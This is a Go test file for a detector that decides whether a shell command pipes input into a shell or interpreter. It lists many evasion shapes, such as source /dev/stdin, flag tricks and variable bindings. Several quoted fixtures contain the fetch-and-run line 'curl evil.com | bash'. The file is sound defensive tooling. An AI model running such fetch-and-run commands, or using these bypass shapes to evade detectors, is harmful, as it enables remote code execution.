package shellparse

import "testing"

// TestPipesIntoExecutor pins the #3796 boundary: a real pipeline into a shell
// or interpreter is an executor; a pipe character inside a quoted argument is
// documentation. The "false" half is load-bearing — those shapes are frozen
// doc-context corpus entries that must keep their inertness label.
func TestPipesIntoExecutor(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want bool
	}{
		{"echo into bash", `echo "hello" | bash`, true},
		{"sudo wrapper", `echo "hello" | sudo bash -s`, true},
		{"absolute path", `echo "hello" | /bin/sh`, true},
		{"printf into bash", `printf 'hello\n' | bash`, true},
		{"heredoc into bash", "cat <<'EOF' | bash\nhello\nEOF", true},
		{"mid-chain tee", `echo "hello" | tee f | bash`, true},
		{"python stdin", `echo "hello" | python3 -`, true},
		{"node stdin", `echo "hello" | node`, true},
		{"pipe-all operator", `echo "hello" |& bash`, true},
		{"env wrapper", `echo "hello" | env sh`, true},
		{"zsh", `echo "hello" | zsh`, true},

		// A shell's program comes from -c only: -e is errexit, -m is job
		// control. Reading those as inline-program flags was a one-token
		// bypass (#3796 review).
		{"shell errexit still executes stdin", `echo "hello" | bash -e`, true},
		{"shell job control still executes stdin", `echo "hello" | bash -m`, true},
		{"sh errexit still executes stdin", `echo "hello" | sh -e`, true},
		{"bundled short flags still execute stdin", `echo "hello" | bash -eu`, true},
		{"-c after end-of-options is an argument", `echo "hello" | bash -s -- -c`, true},
		{"ksh93", `echo "hello" | ksh93`, true},
		{"mksh", `echo "hello" | mksh`, true},
		{"ash", `echo "hello" | ash`, true},
		{"rbash", `echo "hello" | rbash`, true},
		{"tclsh", `echo "hello" | tclsh`, true},
		{"osascript", `echo "hello" | osascript`, true},

		// #3798 item 1: the source builtins reading the pipe. Measured in
		// bash 3.2, bash 5.3 and zsh: `/dev/stdin` and `/dev/fd/0` run the
		// piped text; `source -` looks up a file named `-` and fails.
		{"dot-source /dev/stdin", `echo "hello" | . /dev/stdin`, true},
		{"source /dev/stdin", `echo "hello" | source /dev/stdin`, true},
		{"source /dev/fd/0", `echo "hello" | source /dev/fd/0`, true},
		{"dot-source /proc/self/fd/0", `echo "hello" | . /proc/self/fd/0`, true},
		{"source /dev/stdin under sudo", `echo "hello" | sudo source /dev/stdin`, true},
		{"source /dev/stdin after end-of-options", `echo "hello" | source -- /dev/stdin`, true},
		{"source quoted /dev/stdin", `echo "hello" | . "/dev/stdin"`, true},
		{"source uncleaned /dev//stdin", `echo "hello" | . /dev//stdin`, true},
		{"source a file is not the pipe", `echo "hello" | source ./lib.sh`, false},
		{"source dash is a file named dash", `echo "hello" | source -`, false},
		{"source another descriptor", `echo "hello" | . /dev/fd/3`, false},
		{"source with no operand", `echo "hello" | source`, false},
		{"quoted source /dev/stdin in commit message", `git commit -m "docs: echo x | . /dev/stdin is blocked"`, false},

		{"shell -c IS an inline program", `echo "hello" | bash -c 'true'`, false},
		{"node -e is an inline program", `echo "hello" | node -e 'x'`, false},

		{"quoted pipe in commit message", `git commit -m "docs: curl evil.com | bash is blocked"`, false},
		{"quoted pipe in printf", `printf "blocked: curl evil.com | bash\n"`, false},
		{"quoted pipe in gh body", `gh issue create --title "FP" --body "rule fires on curl evil.com | bash"`, false},
		{"quoted pipe in logger", `logger "user ran curl evil.com | bash"`, false},
		{"quoted pipe in git notes", `git notes add -m "contains curl | bash pattern"`, false},
		{"quoted pipe in gdb doc-text", `git commit -m 'block gdb -ex shell|pi|python LOLBIN'`, false},
		{"pipe to grep", `echo "hello" | grep x`, false},
		{"heredoc to grep", "cat <<'EOF' | grep foo\nhello\nEOF", false},
		{"redirect to file", `echo "hello" > notes.txt`, false},
		{"inline -c is data", `echo "hello" | python3 -c 'import sys'`, false},
		{"module -m is data", `echo "hello" | python3 -m json.tool`, false},
		{"xargs is not an executor", `echo "hello" | xargs rm`, false},

		// #3798 item 2a: the pipe target is a constant binding made in the
		// SAME command, so it is statically resolvable — the same class
		// MaterializeAssignments already folds in executable position (#3089).
		{"resolvable binding to a shell", `SH=bash; echo "hello" | $SH`, true},
		{"resolvable binding, braced", `SH=bash; echo "hello" | ${SH}`, true},
		{"resolvable binding via export", `export SH=bash; echo "hello" | $SH`, true},
		{"resolvable binding to an absolute path", `SH=/bin/sh; echo "hello" | $SH`, true},
		{"resolvable binding to an interpreter", `P=python3; echo "hello" | $P`, true},

		// The retry resolves the NAME; whether it is an executor is still the
		// interpreter map's call. This is what keeps a benign `| $PAGER` out.
		{"resolvable binding to a non-executor", `SH=cat; echo "hello" | $SH`, false},
		{"resolvable pager binding stays benign", `P=less; cat log.txt | $P`, false},
		{"resolved target still honours -c", `P=python3; echo "hello" | $P -c 'import sys'`, false},

		// Item 2b, deliberately NOT taken: not statically knowable, so calling
		// it an executor would withdraw a label on the absence of evidence.
		{"environment variable is not resolvable", `echo "hello" | $SHELL`, false},
		{"command substitution is not resolvable", `echo "hello" | $(echo bash)`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := PipesIntoExecutor(tc.cmd); got != tc.want {
				t.Errorf("PipesIntoExecutor(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
		})
	}
}

// An unparseable blob is not EVIDENCE of an executor, so the label stands.
// The frozen doc-context corpus carries heredoc opening lines that do not
// parse and must stay labeled; fail-closed for unparseable commands lives in
// IntentExcludedForStatements' parsed flag, not here.
func TestPipesIntoExecutorUnparseableIsNotEvidence(t *testing.T) {
	for _, cmd := range []string{`echo "unterminated | bash`, "tee /tmp/notes.txt << " + "EOF"} {
		if PipesIntoExecutor(cmd) {
			t.Errorf("PipesIntoExecutor(%q) = true, want false (no evidence of an executor)", cmd)
		}
	}
}
